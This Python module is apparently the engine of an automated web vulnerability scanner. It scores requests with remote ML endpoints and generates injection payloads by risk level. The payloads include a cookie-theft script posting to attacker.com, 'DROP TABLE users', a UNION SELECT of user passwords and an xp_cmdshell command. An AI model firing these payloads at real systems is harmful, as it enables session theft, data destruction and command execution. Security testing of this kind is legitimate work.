import os
import requests
from .pattern_analyzer import PatternAnalyzer
from .anomaly_detector import AnomalyDetector
from .threat_classifier import ThreatClassifier

class AIEngine:
    def __init__(self):
        self.pattern_analyzer = PatternAnalyzer()
        self.anomaly_detector = AnomalyDetector()
        self.threat_classifier = ThreatClassifier()
        self.hf_token = os.getenv("HF_API_TOKEN")  # Set this in your environment

        # Define your endpoint URLs (replace with your actual endpoints if custom)
        self.pattern_url = "https://api-inference.huggingface.co/models/microsoft/codebert-base"
        self.anomaly_url = "https://api-inference.huggingface.co/models/microsoft/anomaly-detector"
        self.threat_url = "https://api-inference.huggingface.co/models/distilbert-base-uncased"

        self.headers = {"Authorization": f"Bearer {self.hf_token}"}

    def analyze_request(self, request_data):
        pattern_score = self._analyze_patterns(request_data)
        anomaly_score = self._detect_anomalies(request_data)
        threat_level = self._classify_threat(request_data)
        risk_score = self._calculate_risk_score(pattern_score, anomaly_score, threat_level)
        return {
            'pattern_score': pattern_score,
            'anomaly_score': anomaly_score,
            'threat_level': threat_level,
            'risk_score': risk_score
        }

    def _analyze_patterns(self, request_data):
        text = self._prepare_text(request_data)
        try:
            response = requests.post(self.pattern_url, headers=self.headers, json={"inputs": text})
            response.raise_for_status()
            result = response.json()
            # Example: result[0]['score'] for 'malicious' class
            if isinstance(result, list) and 'score' in result[0]:
                return float(result[0]['score'])
            return 0.0
        except Exception:
            return self.pattern_analyzer.analyze(request_data)

    def _detect_anomalies(self, request_data):
        text = self._prepare_text(request_data)
        try:
            response = requests.post(self.anomaly_url, headers=self.headers, json={"inputs": text})
            response.raise_for_status()
            result = response.json()
            if isinstance(result, list) and 'score' in result[0]:
                return float(result[0]['score'])
            return 0.0
        except Exception:
            return self.anomaly_detector.detect(request_data)

    def _classify_threat(self, request_data):
        text = self._prepare_text(request_data)
        try:
            response = requests.post(self.threat_url, headers=self.headers, json={"inputs": text})
            response.raise_for_status()
            result = response.json()
            # Weighted sum of probabilities for threat levels
            if isinstance(result, list) and all('score' in item for item in result):
                scores = [item['score'] for item in result]
                weights = [0.1, 0.3, 0.6, 0.9]  # weights for [low, medium, high, critical]
                threat_level = sum(s * w for s, w in zip(scores, weights))
                return threat_level
            return 0.0
        except Exception:
            return self.threat_classifier.classify(request_data)

    def _prepare_text(self, request_data):
        if isinstance(request_data, str):
            return request_data
        if isinstance(request_data, dict):
            return " ".join(f"{k}: {v}" for k, v in request_data.items())
        return str(request_data)

    def _calculate_risk_score(self, pattern_score, anomaly_score, threat_level):
        weights = {'pattern': 0.3, 'anomaly': 0.4, 'threat': 0.3}
        return min(1.0, 
            pattern_score * weights['pattern'] +
            anomaly_score * weights['anomaly'] +
            threat_level * weights['threat']
        )

    def generate_payloads(self, analysis_data):
        """
        Generate dynamic payloads based on analysis data.
        This implementation includes a range of payloads from basic to advanced levels.
        """
        url = analysis_data.get('url', '')
        analysis = analysis_data.get('analysis', {})

        payloads = []

        # Basic XSS payloads
        basic_xss_payloads = [
            {'type': 'XSS', 'content': '<script>alert("XSS")</script>', 'method': 'GET', 'data': None, 'headers': {}},
            {'type': 'XSS', 'content': '\"><script>alert(1)</script>', 'method': 'GET', 'data': None, 'headers': {}}
        ]

        # Advanced XSS payloads (NSA-level)
        advanced_xss_payloads = [
            {'type': 'XSS', 'content': '<svg/onload=alert(1)>', 'method': 'GET', 'data': None, 'headers': {}},
            {'type': 'XSS', 'content': '<img src=x onerror=alert(1)>', 'method': 'GET', 'data': None, 'headers': {}},
            {'type': 'XSS', 'content': '\'><script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>', 'method': 'GET', 'data': None, 'headers': {}}
        ]

        # Basic SQL Injection payloads
        basic_sql_payloads = [
            {'type': 'SQL Injection', 'content': "' OR '1'='1", 'method': 'GET', 'data': None, 'headers': {}},
            {'type': 'SQL Injection', 'content': "'; DROP TABLE users; --", 'method': 'GET', 'data': None, 'headers': {}}
        ]

        # Advanced SQL Injection payloads (NSA-level)
        advanced_sql_payloads = [
            {'type': 'SQL Injection', 'content': "' UNION SELECT username, password FROM users --", 'method': 'GET', 'data': None, 'headers': {}},
            {'type': 'SQL Injection', 'content': "'; EXEC xp_cmdshell('dir'); --", 'method': 'GET', 'data': None, 'headers': {}}
        ]

        # Add payloads based on risk score thresholds
        risk_score = analysis.get('risk_score', 0)
        if risk_score > 0.1:
            payloads.extend(basic_xss_payloads)
            payloads.extend(basic_sql_payloads)
        if risk_score > 0.5:
            payloads.extend(advanced_xss_payloads)
            payloads.extend(advanced_sql_payloads)

        return payloads

    def analyze_response(self, response_data, model_choice="finetuned_bert", task="question-answering"):
        """
        Analyze HTTP response data to detect potential vulnerabilities.
        Supports multiple model choices and tasks for flexible analysis.
        """
        import requests
        import os
        import logging

        content = response_data.get('content', '')
        hf_token = os.getenv("HF_API_TOKEN")

        # Define model endpoints mapping
        model_endpoints = {
            "finetuned_bert": os.getenv("HACKERONE_BERT_ENDPOINT_URL"),
            "basic_signature": None,  # No endpoint, use basic signature analysis
            # Add other models and their endpoints here
        }

        endpoint_url = model_endpoints.get(model_choice)

        if model_choice == "basic_signature" or not hf_token or not endpoint_url:
            # Basic signature-based analysis fallback
            content_lower = content.lower()
            risk_score = 0.0

            xss_signatures = ['<script>alert("xss")</script>', '<svg/onload=alert(1)>', '<img src=x onerror=alert(1)>']
            if any(sig in content_lower for sig in xss_signatures):
                risk_score = max(risk_score, 0.9)

            sql_errors = ['sql syntax error', 'mysql error', 'syntax error', 'unclosed quotation mark', 'sqlstate']
            if any(err in content_lower for err in sql_errors):
                risk_score = max(risk_score, 0.8)

            return {'risk_score': risk_score}

        headers = {"Authorization": f"Bearer {hf_token}"}
        if task == "question-answering":
            payload = {
                "inputs": {
                    "question": "Is this response vulnerable or contains security issues?",
                    "context": content
                }
            }
        else:
            payload = {
                "inputs": content
            }

        try:
            logging.info(f"Sending payload to model endpoint: {payload}")
            response = requests.post(endpoint_url, headers=headers, json=payload, timeout=15)
            response.raise_for_status()
            result = response.json()
            logging.info(f"Received response from model endpoint: {result}")
            # Assume the model returns a score or label indicating vulnerability risk
            risk_score = 0.0
            if isinstance(result, dict) and "score" in result:
                risk_score = float(result["score"])
            elif isinstance(result, list) and len(result) > 0 and "score" in result[0]:
                risk_score = float(result[0]["score"])
            elif isinstance(result, dict) and "answer" in result:
                # For question-answering task, interpret answer presence as risk indicator
                answer = result.get("answer", "").lower()
                if "yes" in answer or "vulnerable" in answer or "issue" in answer:
                    risk_score = 0.9
                else:
                    risk_score = 0.1
            return {"risk_score": risk_score}
        except Exception as e:
            logging.error(f"Error calling model endpoint: {e}")
            # On error, fallback to basic analysis
            content_lower = content.lower()
            risk_score = 0.0

            xss_signatures = ['<script>alert("xss")</script>', '<svg/onload=alert(1)>', '<img src=x onerror=alert(1)>']
            if any(sig in content_lower for sig in xss_signatures):
                risk_score = max(risk_score, 0.9)

            sql_errors = ['sql syntax error', 'mysql error', 'syntax error', 'unclosed quotation mark', 'sqlstate']
            if any(err in content_lower for err in sql_errors):
                risk_score = max(risk_score, 0.8)

            return {'risk_score': risk_score}
